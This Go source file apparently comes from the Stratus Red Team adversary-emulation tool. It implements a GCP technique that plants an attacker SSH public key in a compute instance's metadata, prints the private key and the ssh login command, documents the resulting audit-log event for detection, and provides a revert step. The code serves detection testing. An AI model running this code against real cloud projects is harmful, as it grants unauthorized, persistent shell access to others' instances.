package gcp

import (
    "context"
    _ "embed"
    "fmt"
    "log"
    "strings"
    "google.golang.org/api/compute/v1"
    gcp_utils "github.com/datadog/stratus-red-team/v2/internal/utils/gcp"
    "github.com/datadog/stratus-red-team/v2/pkg/stratus"
    "github.com/datadog/stratus-red-team/v2/pkg/stratus/mitreattack"
)

//go:embed main.tf
var tf []byte

const AttackerUsername = "stratus-skim"

func init() {
    const CodeBlock = "```"
    const AttackTechniqueId = "gcp.lateral-movement.add-sshkey-instance-metadata"

    stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
        ID:           AttackTechniqueId,
        FriendlyName: "Register SSH public key to instance metadata",
        Description: `
Register a public key to the instance's metadata to allow login and gain access to the instance.

Warm-up: 

- Create a compute instance (Linux)

Detonation:

- Create RSA key-pair (private key and public key)
- Register public key to instance's metadata.
- Print private key to stdout. 

Note that you need to save the private key for login.

Reference:
- https://cloud.google.com/sdk/gcloud/reference/compute/instances/add-metadata
- https://cloud.hacktricks.wiki/en/pentesting-cloud/gcp-security/gcp-privilege-escalation/gcp-compute-privesc/gcp-add-custom-ssh-metadata.html
`,
        Detection: `
Registering SSH public key to the instance's metadata is detected as 'compute.instances.setMetadata' in Cloud Logging

Sample event (shortened for readability):

` + CodeBlock + `json
{
  "logName": "projects/my-project-id/logs/cloudaudit.googleapis.com%2Factivity",
  "protoPayload": {
    "authenticationInfo": {
      "principalEmail": "username@service.com",
    },
    "metadata": {
      "instanceMetadataDelta": {
        "addedMetadataKeys": [
          "ssh-keys public-key-here",
        ],
      },
    },
    "serviceName": "compute.googleapis.com",
    "methodName": "v1.compute.instances.setMetadata",
    "resourceName": "projects/my-project-id/zones/my-zone-id/instances/my-instance-id",
  },
  "resource": {
    "type": "gce_instance"
  },
  "severity": "NOTICE"
}
` + CodeBlock + `
`,
        Platform:                   stratus.GCP,
        IsIdempotent:               true,
        MitreAttackTactics:         []mitreattack.Tactic{ 
            mitreattack.LateralMovement, 
            mitreattack.Persistence },
        PrerequisitesTerraformCode: tf,
        Detonate:                   detonate,
        Revert:                     revert,
    })
}

func detonate(params map[string]string, providers stratus.CloudProviders) error {
    gcp := providers.GCP()
    ctx := context.Background()

    projectId    := gcp.GetProjectId()
    zone         := params["zone"]
    instanceName := params["instance_name"]
    instanceIp   := params["instance_ip"]

    // create compute service
    service, err := compute.NewService(ctx, gcp.Options())
    if err != nil {
        return fmt.Errorf("Failed to create compute service: %v", err)
    }

    log.Println("Generating public/private key pair for user")

    // create RSA public/key pair
    key, err := gcp_utils.CreateSSHKeyPair()
    if err != nil {
        return fmt.Errorf("Failed to create RSA key-pair: %v", err)
    }

    log.Println("Registering public key to instance's metadata")
    
    // get instance information
    instance, err := service.Instances.Get(projectId, zone, instanceName).Do()
    if err != nil {
        return fmt.Errorf("Failed to get instance information: %v", err)
    }

    md := instance.Metadata
    entry := fmt.Sprintf("%s:%s", AttackerUsername, string(key.PublicKey))

    gcp_utils.InsertToMetadata(md, "ssh-keys", entry)
    if _, err := service.Instances.SetMetadata(projectId, zone, instanceName, md).Do(); err != nil {
        return fmt.Errorf("Failed to update instance metadata: %v", err)
    }

    log.Printf("Save this Private Key as 'account.priv':\n\n%s\n", key.PrivateKey)
    log.Println("Attacker can now login to the instance using the following command:")
    log.Printf("ssh -i account.priv %s@%s", AttackerUsername, instanceIp)

    return nil
}

func revert(params map[string]string, providers stratus.CloudProviders) error {
    gcp := providers.GCP()
    ctx := context.Background()

    projectId    := gcp.GetProjectId()
    zone         := params["zone"]
    instanceName := params["instance_name"]

    service, err := compute.NewService(ctx, gcp.Options())
    if err != nil {
        return fmt.Errorf("failed to create compute service: %v", err)
    }

    instance, err := service.Instances.Get(projectId, zone, instanceName).Do()
    if err != nil {
        return fmt.Errorf("failed to get instance information: %v", err)
    }

    md := instance.Metadata
    for _, mdi := range md.Items {
        if mdi.Key == "ssh-keys" && mdi.Value != nil {
            lines := strings.Split(*mdi.Value, "\n")
            var filtered []string
            for _, line := range lines {
                if !strings.HasPrefix(line, AttackerUsername+":") {
                    filtered = append(filtered, line)
                }
            }
            val := strings.Join(filtered, "\n")
            mdi.Value = &val
            break
        }
    }

    log.Println("Removing attacker SSH key from instance metadata")
    if _, err := service.Instances.SetMetadata(projectId, zone, instanceName, md).Do(); err != nil {
        return fmt.Errorf("failed to update instance metadata: %v", err)
    }

    return nil
}